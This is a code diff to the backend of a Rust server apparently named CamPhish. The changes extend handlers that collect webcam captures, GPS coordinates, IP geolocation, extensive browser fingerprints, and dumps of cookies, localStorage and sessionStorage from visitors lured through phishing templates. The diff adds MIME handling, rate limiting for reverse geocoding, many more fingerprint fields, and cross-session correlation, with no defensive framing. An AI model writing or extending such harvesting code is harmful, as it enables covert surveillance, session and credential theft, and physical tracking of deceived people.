@@ -102,24 +102,35 @@ pub async fn receive_image(
         return Err(StatusCode::TOO_MANY_REQUESTS);
     }
     let session_id = get_session(&payload.session);
-    let filtered = payload.cat.split(',').nth(1).unwrap_or("");
-    let raw = base64::engine::general_purpose::STANDARD.decode(filtered)
+    let (mime, b64_data) = match payload.cat.split_once(',') {
+        Some((header, data)) if !data.is_empty() => {
+            let mime = if let Some(s) = header.strip_prefix("data:") {
+                s.split(';').next().unwrap_or("image/png").to_string()
+            } else {
+                "image/png".to_string()
+            };
+            (mime, data)
+        }
+        _ => return Err(StatusCode::BAD_REQUEST),
+    };
+    let raw = base64::engine::general_purpose::STANDARD.decode(b64_data)
         .map_err(|_| StatusCode::BAD_REQUEST)?;
     if raw.is_empty() { return Err(StatusCode::BAD_REQUEST); }
 
     let now = chrono::Utc::now().timestamp();
     let id = uuid::Uuid::new_v4().to_string();
-    let filename = format!("{}_{}.png", session_id, chrono::Utc::now().format("%Y%m%d%H%M%S%f"));
+    let ext = mime.split('/').nth(1).unwrap_or("png");
+    let filename = format!("{}_{}.{}", session_id, chrono::Utc::now().format("%Y%m%d%H%M%S%f"), ext);
     let file_path = format!("{}/captures/{}", state.data_dir, filename);
     let method = payload.capture_method.unwrap_or_else(|| "canvas".into());
 
-    std::fs::write(&file_path, &raw).map_err(|e| { tracing::error!("File write failed: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
+    tokio::fs::write(&file_path, &raw).await.map_err(|e| { tracing::error!("File write failed: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
     sqlx::query(
-        "INSERT INTO captures (id, session_id, filename, file_type, file_size, file_path, capture_method, created_at) VALUES (?, ?, ?, 'image/png', ?, ?, ?, ?)"
+        "INSERT INTO captures (id, session_id, filename, file_type, file_size, file_path, capture_method, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
     )
     .bind(&id).bind(&session_id).bind(&filename)
-    .bind(raw.len() as i64).bind(&file_path).bind(&method).bind(now)
+    .bind(&mime).bind(raw.len() as i64).bind(&file_path).bind(&method).bind(now)
     .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite capture insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
     let _ = sqlx::query("UPDATE templates SET total_camera_grants = total_camera_grants + 1 WHERE id = (SELECT template_id FROM sessions WHERE id = ?)")
@@ -161,17 +172,21 @@ pub async fn receive_location(
     .bind(payload.altitude).bind(payload.heading).bind(payload.speed).bind(now)
     .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite location insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
-    // Reverse geocode in background
+    // Reverse geocode in background (with rate limiting)
     let pool = state.pool.clone();
     let http = state.http.clone();
+    let limiter = state.external_api_limiter.clone();
     let lat = payload.lat;
     let lon = payload.lon;
     tokio::spawn(async move {
+        // Nominatim: 1 req/sec — acquire permit + sleep 1.2s between calls
+        let _permit = limiter.acquire().await.expect("semaphore not closed");
+        tokio::time::sleep(std::time::Duration::from_millis(1200)).await;
         let url = format!(
             "https://nominatim.openstreetmap.org/reverse?lat={}&lon={}&format=json&addressdetails=1&zoom=16",
             lat, lon
         );
-        match http.get(&url).header("User-Agent", "CamPhish/2.1").send().await {
+        match http.get(&url).header("User-Agent", "CamPhish/2.1/geocode").send().await {
             Ok(r) if r.status().is_success() => {
                 if let Ok(geo) = r.json::<serde_json::Value>().await {
                     let addr = geo.get("display_name").and_then(|v| v.as_str()).unwrap_or("");
@@ -181,7 +196,8 @@ pub async fn receive_location(
                     }
                 }
             }
-            _ => tracing::debug!("Nominatim reverse geocode failed for {}/{}", lat, lon),
+            Ok(r) => tracing::debug!("Nominatim geocode returned {} for {}/{}", r.status(), lat, lon),
+            Err(e) => tracing::debug!("Nominatim geocode request failed for {}/{}: {}", lat, lon, e),
         }
     });
 
@@ -233,12 +249,14 @@ pub async fn receive_ip(
             .execute(&state.pool).await;
     }
 
-    // IP geolocation in background (skip private/local IPs)
+    // IP geolocation in background with rate limiting (ip-api.com: 45 req/min)
     if !ip.starts_with("10.") && !ip.starts_with("192.168.") && !ip.starts_with("172.16.") && !ip.starts_with("127.") && ip != "unknown" {
         let pool = state.pool.clone();
         let http = state.http.clone();
+        let limiter = state.external_api_limiter.clone();
         let ip_clone = ip.clone();
         tokio::spawn(async move {
+            let _permit = limiter.acquire().await.expect("semaphore not closed");
             let url = format!("http://ip-api.com/json/{}?fields=status,message,city,region,country,lat,lon,isp,org,as,query", ip_clone);
             match http.get(&url).send().await {
                 Ok(r) if r.status().is_success() => {
@@ -252,7 +270,8 @@ pub async fn receive_ip(
                         }
                     }
                 }
-                _ => tracing::debug!("IP geolocation failed for {}", ip_clone),
+                Ok(r) => tracing::debug!("IP geolocation returned {} for {}", r.status(), ip_clone),
+                Err(e) => tracing::debug!("IP geolocation request failed for {}: {}", ip_clone, e),
             }
         });
     }
@@ -275,21 +294,67 @@ pub async fn receive_fingerprint(
     let ua = headers.get("user-agent").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
     let (device, browser, os) = parse_ua(&ua);
     let now = chrono::Utc::now().timestamp();
-    let _data_str = serde_json::to_string(&payload.extra).unwrap_or_default();
+    let e = &payload.extra;
+    let id = uuid::Uuid::new_v4().to_string();
+
+    // Helper: extract str from json value
+    let gs = |k: &str| -> Option<&str> { e.get(k).and_then(|v| v.as_str()) };
+    let gi = |k: &str| -> Option<i64> { e.get(k).and_then(|v| v.as_i64()) };
+    let gf = |k: &str| -> Option<f64> { e.get(k).and_then(|v| v.as_f64()) };
+    let gb = |k: &str| -> Option<bool> { e.get(k).and_then(|v| v.as_bool()) };
 
     sqlx::query(
-        "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, canvas_fingerprint, webgl_fingerprint, font_list, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+        "INSERT INTO ip_logs (\
+            id, session_id, ip_address, user_agent, device, browser, os, \
+            screen_resolution, color_depth, timezone, timezone_offset, language, languages, platform, \
+            pixel_ratio, hardware_concurrency, device_memory, max_touch_points, cookie_enabled, do_not_track, \
+            canvas_fingerprint, webgl_fingerprint, webgl_vendor, webgl_renderer, font_list, font_count, \
+            audio_sample_rate, connection_type, connection_downlink, connection_rtt, \
+            battery_level, battery_charging, \
+            camera_count, microphone_count, has_gyroscope, has_accelerometer, \
+            voice_count, voice_languages, local_ip, \
+            created_at\
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
     )
-    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id).bind(&ip).bind(&ua)
+    .bind(&id).bind(&session_id).bind(&ip).bind(&ua)
     .bind(&device).bind(&browser).bind(&os)
-    .bind(payload.extra.get("canvas_fingerprint").and_then(|v| v.as_str()))
-    .bind(payload.extra.get("webgl_fingerprint").and_then(|v| v.as_str()))
-    .bind(payload.extra.get("font_list").and_then(|v| v.as_str()))
+    .bind(gs("screen_resolution"))
+    .bind(gi("color_depth"))
+    .bind(gs("timezone"))
+    .bind(gi("timezone_offset"))
+    .bind(gs("language"))
+    .bind(gs("languages"))
+    .bind(gs("platform"))
+    .bind(gf("pixel_ratio"))
+    .bind(gi("hardware_concurrency"))
+    .bind(gf("device_memory"))
+    .bind(gi("max_touch_points"))
+    .bind(gb("cookie_enabled"))
+    .bind(gs("do_not_track"))
+    .bind(gs("canvas_fingerprint"))
+    .bind(gs("webgl_fingerprint"))
+    .bind(gs("webgl_vendor"))
+    .bind(gs("webgl_renderer"))
+    .bind(gs("font_list"))
+    .bind(gi("font_count"))
+    .bind(gi("audio_sample_rate"))
+    .bind(gs("connection_type"))
+    .bind(gf("connection_downlink"))
+    .bind(gi("connection_rtt"))
+    .bind(gf("battery_level"))
+    .bind(gb("battery_charging"))
+    .bind(gi("camera_count"))
+    .bind(gi("microphone_count"))
+    .bind(gb("has_gyroscope"))
+    .bind(gb("has_accelerometer"))
+    .bind(gi("voice_count"))
+    .bind(gs("voice_languages"))
+    .bind(gs("local_ip"))
     .bind(now)
     .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite fingerprint insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
     // Cross-session correlation
-    if let Some(canvas_fp) = payload.extra.get("canvas_fingerprint").and_then(|v| v.as_str()) {
+    if let Some(canvas_fp) = gs("canvas_fingerprint") {
         let matches: Vec<(String,)> = sqlx::query_as(
             "SELECT DISTINCT session_id FROM ip_logs WHERE canvas_fingerprint = ? AND session_id != ?"
         ).bind(canvas_fp).bind(&session_id).fetch_all(&state.pool).await.unwrap_or_default();
@@ -301,7 +366,7 @@ pub async fn receive_fingerprint(
         }
     }
 
-    log_event(&state, &session_id, "fingerprint_collected", serde_json::json!({"has_canvas": payload.extra.get("canvas_fingerprint").is_some()})).await;
+    log_event(&state, &session_id, "fingerprint_collected", serde_json::json!({"has_canvas": gs("canvas_fingerprint").is_some()})).await;
     tracing::info!("🔍 Fingerprint: {} session={}", ip, session_id);
     Ok(StatusCode::OK)
 }
@@ -345,8 +410,12 @@ pub async fn receive_storage(
         .bind(&id).bind(&session_id).bind(&data_str).bind(&ip).bind(now)
         .execute(&state.pool).await.map_err(|e| { tracing::error!("Storage insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
 
+    let key_types: Vec<&str> = ["cookies", "localStorage", "sessionStorage"].iter()
+        .filter(|&&k| body.extra.get(k).is_some())
+        .copied()
+        .collect();
     log_event(&state, &session_id, "storage_captured", serde_json::json!({
-        "keys": body.extra.get("localStorage_keys").or(Some(&serde_json::Value::Null)),
+        "key_types": key_types,
     })).await;
 
     tracing::info!("💾 Storage dump received for session {} (IP: {})", session_id, ip);
